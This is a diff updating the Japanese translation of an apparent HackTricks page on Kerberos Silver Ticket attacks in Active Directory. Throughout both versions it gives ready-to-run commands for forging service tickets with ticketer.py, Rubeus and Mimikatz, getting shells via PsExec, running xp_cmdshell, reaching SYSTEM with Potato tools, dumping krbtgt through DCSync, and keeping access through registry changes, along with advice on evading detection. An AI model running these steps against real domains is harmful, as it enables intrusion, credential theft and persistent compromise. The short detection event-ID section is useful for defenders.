@@ -6,49 +6,52 @@
 
 ## Silver ticket
 
-**Silver Ticket** attack は、Active Directory (AD) 環境における service ticket の悪用を伴います。この手法では、computer account などの **service account の NTLM hash を取得**し、それを使って Ticket Granting Service (TGS) ticket を偽造します。この偽造した ticket により、攻撃者はネットワーク上の特定の service にアクセスし、**任意の user になりすます**ことができます。通常は administrative privileges の取得が目的です。ticket の偽造には AES keys を使用する方が、より安全で検出されにくい点が強調されています。<sup>[[1]](#references)[[2]](#references)</sup>
+**Silver Ticket** attackでは、Active Directory（AD）環境におけるservice ticketを悪用します。この手法では、コンピューターアカウントなどの**service accountのNTLM hashを取得**し、Ticket Granting Service（TGS）ticketを偽造します。偽造したticketを使うと、攻撃者はネットワーク上の特定のserviceにアクセスし、通常は管理者権限を狙って**任意のユーザーになりすます**ことができます。ticketの偽造にはAES keyを使うほうが、より安全で検知されにくい点に注意してください。<sup>[[1]](#references)[[2]](#references)</sup>
 
 > [!WARNING]
-> Silver Tickets は、krbtgt account ではなく **service account の hash** だけを必要とするため、Golden Tickets より検出されにくくなります。ただし、対象とする特定の service に限定されます。さらに、user の password を盗むだけでも同様です。
-さらに、**SPN が設定された account の password を侵害**した場合、その password を使って、その service に対して任意の user になりすます Silver Ticket を作成できます。
+> Silver Ticketは、krbtgtアカウントではなく**service accountのhash**だけで作成できるため、Golden Ticketより検知されにくい手法です。ただし、対象とする特定のserviceにしか使えません。また、ユーザーのpasswordを盗むだけの場合も同様です。
+さらに、**SPNが設定されたアカウントのpasswordを侵害**した場合、そのpasswordを使って、そのserviceに対して任意のユーザーになりすますSilver Ticketを作成できます。
 
-### Modern Kerberos changes (AES-only domains)
+### Modern Kerberosの変更点（AES-onlyドメイン）
 
-- **2022 年 11 月 8 日 (KB5021131)** 以降の Windows updates では、可能な場合に service ticket の **AES session keys** がデフォルトで使用され、RC4 は段階的に廃止されています。DC では **2026 年半ばまでに RC4 がデフォルトで無効化**される予定であるため、Silver Ticket に NTLM/RC4 hashes を依存すると、`KRB_AP_ERR_MODIFIED` により失敗するケースが増えます。対象の service account から常に **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) を抽出してください。<sup>[[5]](#references)</sup>
-- service account の `msDS-SupportedEncryptionTypes` が AES に制限されている場合、`/aes256` または `-aesKey` を使用して forge する必要があります。NTLM hash を保有していても、RC4 (`/rc4` または `-nthash`) は機能しません。<sup>[[6]](#references)</sup>
-- gMSA/computer accounts は 30 日ごとに rotate されます。forge する前に、LSASS、Secretsdump/NTDS、または DCsync から **current AES key** を dump してください。
-- OPSEC: tools のデフォルトの ticket lifetime は、多くの場合 **10 年**です。異常な lifetime による検出を避けるため、現実的な期間（例: `-duration 600` minutes）を設定してください。<sup>[[6]](#references)</sup>
+- **2022年11月8日（KB5021131）**以降のWindows更新では、可能な場合、service ticketのsession keyにAESをデフォルトで使用し、RC4を段階的に廃止しています。2026年半ばまでに、DCではRC4がデフォルトで**無効**になる見込みです。そのため、silver ticketにNTLM/RC4 hashを使うと、失敗して `KRB_AP_ERR_MODIFIED` が発生するケースが増えています。対象service accountの**AES key**（`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`）を必ず取得してください。<sup>[[5]](#references)</sup>
+- service accountの `msDS-SupportedEncryptionTypes` がAESに制限されている場合は、`/aes256` または `-aesKey` を使って偽造する必要があります。NTLM hashを持っていても、RC4（`/rc4` または `-nthash`）は使えません。<sup>[[6]](#references)</sup>
+- gMSA/コンピューターアカウントは30日ごとにローテーションされます。偽造する前に、LSASS、Secretsdump/NTDS、またはDCsyncから**現在のAES key**をdumpしてください。
+- OPSEC: ツールのデフォルトのticket有効期間は**10年**であることが多いため、異常な有効期間による検知を避けるには、現実的な期間（例: `-duration 600` 分）を設定してください。<sup>[[6]](#references)</sup>
 
-ticket crafting には、operating system に応じて異なる tools が使用されます。
+ticketの作成には、OSに応じて異なるツールを使います。
 
-### On Linux
+### Linuxの場合
+
 ```bash
 # Forge with AES instead of RC4 (supports gMSA/machine accounts)
 python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
--spn <SERVICE_PRINCIPAL_NAME> <USER>
+  -spn <SERVICE_PRINCIPAL_NAME> <USER>
 # or read key directly from a keytab (useful when only keytab is obtained)
 python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>
 
 # shorten validity for stealth
 python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
--spn cifs/<HOST_FQDN> -duration 480 <USER>
+  -spn cifs/<HOST_FQDN> -duration 480 <USER>
 
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-### Windows上では
+
+### Windowsでは
+
 ```bash
 # Using Rubeus to request a service ticket and inject (works when you already have a TGT)
 # /ldap option is used to get domain data automatically
 rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
-/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd
+  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd
 
 # Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
-/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
+  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
 # RC4 still works only if the DC and service accept RC4
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
-/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
+  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
 
 # Inject an already forged kirbi
 mimikatz.exe "kerberos::ptt <TICKET_FILE>"
@@ -57,91 +60,99 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-CIFS serviceは被害者のファイルシステムへアクセスするための一般的なターゲットとして注目されますが、HOSTやRPCSSなどの他のserviceも、taskやWMI queryに悪用できます。
 
-### 例: MSSQL service (MSSQLSvc) + PotatoでSYSTEM
+CIFS serviceは被害者のファイルシステムにアクセスする一般的なターゲットとして挙げられていますが、HOSTやRPCSSなどの他のserviceも、タスクやWMIクエリに悪用できます。
 
-SQL service account（例: sqlsvc）のNTLM hash（またはAES key）を持っている場合、MSSQL SPN用のTGSをforgeし、任意のuserをSQL serviceにimpersonateできます。そこから、xp_cmdshellを有効化してSQL service accountとしてcommandを実行します。そのtokenにSeImpersonatePrivilegeがある場合、PotatoをchainしてSYSTEMへ権限昇格できます。<sup>[[4]](#references)</sup>
+### 例: MSSQL service (MSSQLSvc) + PotatoでSYSTEM権限を取得
+
+アカウントが所有する**登録済みの正確なSQL service SPN**のNTLM hash（またはAES key）があれば、偽造したservice ticketがそのserviceに受け入れられる可能性があります。ticket内のservice classとhostnameは、実際のSPNと一致している必要があります。すべてのインストールで`MSSQLSvc/`が使われていると思い込まないでください。また、指定したidentityは、`xp_cmdshell`を有効化して実行するために必要な権限を持つSQL loginに対応している必要があります。`xp_cmdshell`コマンドは、SQL serviceのプロセスidentity（またはsysadmin以外の呼び出し元向けに設定されたproxy）で実行されます。別途Potatoを使う前に、その**プロセストークン**で`SeImpersonatePrivilege`が有効か確認してください。service設定やSPNだけでは、それが有効である証拠にはなりません。<sup>[[4]](#references)</sup>
+
 ```bash
 # Forge a silver ticket for MSSQLSvc (AES example)
 python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
--spn MSSQLSvc/<host.fqdn>:1433 administrator
+  -spn MSSQLSvc/<host.fqdn>:1433 administrator
 export KRB5CCNAME=$PWD/administrator.ccache
 
 # Connect to SQL using Kerberos and run commands via xp_cmdshell
 impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
--q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
+  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
 ```
-- 結果として得られたコンテキストに SeImpersonatePrivilege がある場合（service accounts ではよくある）、Potato variant を使用して SYSTEM を取得します：
+
+- 結果のコンテキストに SeImpersonatePrivilege がある場合（サービスアカウントではよくあります）、Potato の亜種を使って SYSTEM を取得します。
+
 ```bash
 # On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
 PrintSpoofer.exe -c "cmd /c whoami"
 # or
 GodPotato -cmd "cmd /c whoami"
 ```
-MSSQLのabusingとxp_cmdshellの有効化についての詳細:
+
+MSSQL の悪用と xp_cmdshell の有効化について詳しくは、以下を参照してください。
 
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
 
-Potato techniquesの概要:
+Potato techniques の概要:
 
 {{#ref}}
 ../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
 {{#endref}}
 
-## 利用可能なServices
+## 利用可能なサービス
 
-| Service Type                               | Service Silver Tickets                                                     |
+| サービスの種類                           | サービス Silver Tickets                                                   |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OSによっては以下も:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>場合によっては、単に次を要求できます: WINRM</p> |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OS によっては以下も含む:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>場合によっては、WINRM だけを要求できます</p> |
 | Scheduled Tasks                            | HOST                                                                       |
-| Windows File Share, also psexec            | CIFS                                                                       |
-| LDAP operations, included DCSync           | LDAP                                                                       |
+| Windows File Share、psexec も含む           | CIFS                                                                       |
+| DCSync を含む LDAP 操作                    | LDAP                                                                       |
 | Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
 | Golden Tickets                             | krbtgt                                                                     |
 
-**Rubeus**を使用すると、次のparameterですべてのticketを**ask for all**できます:
+**Rubeus** を使用すると、以下のパラメーターでこれらすべてのチケットを**要求**できます。
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Silver tickets Event IDs
+### Silver tickets のイベント ID
 
-- 4624: Account Logon
-- 4634: Account Logoff
-- 4672: Admin Logon
-- **同じclient/serviceについて、DC上に先行する4768/4769が存在しない**ことは、偽造されたTGSがserviceに直接提示されたことを示す一般的なindicatorです。
-- 異常に長いticket lifetimeや、想定外のencryption type（domainがAESを強制しているのにRC4）も、4769/4624 data上で目立ちます。
+- 4624: アカウントのログオン
+- 4634: アカウントのログオフ
+- 4672: 管理者のログオン
+- 同じクライアント/サービスについて、DC 上に先行する 4768/4769 がないことは、偽造された TGS がサービスに直接提示されたことを示す一般的な兆候です。
+- 異常に長いチケットの有効期間や、想定外の暗号化方式（ドメインで AES が強制されているのに RC4 が使われている場合）も、4769/4624 のデータで目立ちます。
 
-## Persistence
+## 永続化
 
-マシンが30日ごとにpasswordをrotateするのを防ぐには、`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`を設定します。または、`HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge`を30daysより大きい値に設定し、マシンのpasswordをrotateするrotation perdiodを指定することもできます。<sup>[[3]](#references)</sup>
+マシンが30日ごとにパスワードを変更しないようにするには、`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` を設定します。または、`HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` を30日より大きい値に設定し、マシンのパスワードを変更する間隔を指定できます。<sup>[[3]](#references)</sup>
 
-## Service ticketsのabusing
+## Service tickets の悪用
 
-以下の例では、administrator accountをimpersonateしてticketを取得したとします。
+以下の例では、管理者アカウントになりすましてチケットを取得したとします。
 
 ### CIFS
 
-このticketを使用すると、**SMB**経由で`C$`および`ADMIN$` folder（exposeされている場合）にaccessし、次のように簡単な操作でremote filesystemの一部にfilesをcopyできます:
+このチケットを使うと、（公開されている場合）**SMB** 経由で `C$` および `ADMIN$` フォルダーにアクセスし、次のような操作でリモートファイルシステム内の任意の場所にファイルをコピーできます。
+
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-この権限があれば、host 内で shell を取得したり、**psexec** を使用して任意のコマンドを実行したりできます:
+
+ホスト内で shell を取得したり、**psexec** を使って任意のコマンドを実行したりすることもできます。
 
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
 {{#endref}}
 
-### HOST
+### ホスト
 
-この権限があれば、リモートコンピューター上に scheduled task を作成し、任意のコマンドを実行できます:
+この権限があれば、リモートコンピューター上にスケジュールされたタスクを作成し、任意のコマンドを実行できます。
+
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -153,9 +164,11 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
+
 ### HOST + RPCSS
 
-これらのチケットを使用すると、**被害者システム上で WMI を実行できます**：
+これらのチケットを使うと、被害者システム上で**WMIを実行できます**:
+
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -165,7 +178,8 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-以下のページで **wmiexec に関する詳細情報**を確認してください。
+
+**wmiexec**についての詳細は、以下のページを参照してください。
 
 
 {{#ref}}
@@ -174,27 +188,30 @@ wmic remote.computer.local list full /format:list
 
 ### HOST + WSMAN (WINRM)
 
-コンピューターへの winrm access があれば、**そのコンピューターに access**し、さらに PowerShell を取得できます。
+コンピューターへのWinRMアクセスがあれば、そのコンピューターに**アクセス**し、PowerShellを取得することもできます。
+
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-リモートホストに **winrm** を使用して接続する **その他の方法**については、次のページを確認してください。
 
+以下のページでは、**winrmを使ってリモートホストに接続するその他の方法**を確認できます。
 
 {{#ref}}
 ../lateral-movement/winrm.md
 {{#endref}}
 
 > [!WARNING]
-> リモートコンピューター上で **winrm** が有効化され、listen 状態である必要があります。
+> リモートコンピューターにアクセスするには、**winrmが有効で、リスニング状態である必要があります**。
 
 ### LDAP
 
-この権限を使用すると、**DCSync** によって DC データベースを dump できます:
+この権限があれば、**DCSync**を使ってDCのデータベースをダンプできます：
+
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-**DCSyncについて詳しく学ぶ**には、以下のページを参照してください:
+
+**DCSync について詳しくは**、以下のページをご覧ください:
 
 
 {{#ref}}
@@ -202,13 +219,12 @@ dcsync.md
 {{#endref}}
 
 
-## 参考資料
+## References
 
 - [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
-- [2] [Kerberos (II): How to attack Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-- [3] [Machine Account Password Process - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
-- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
-- [5] [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
-- [6] [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
-
+- [2] [Kerberos (II): Kerberos を攻撃する方法 - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [3] [マシンアカウントのパスワードプロセス - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
+- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato の手順](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [5] [KB5021131 Kerberos の強化と RC4 の廃止](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
+- [6] [Impacket ticketer.py の現在のオプション (AES/keytab/有効期間)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
 {{#include ../../banners/hacktricks-training.md}}
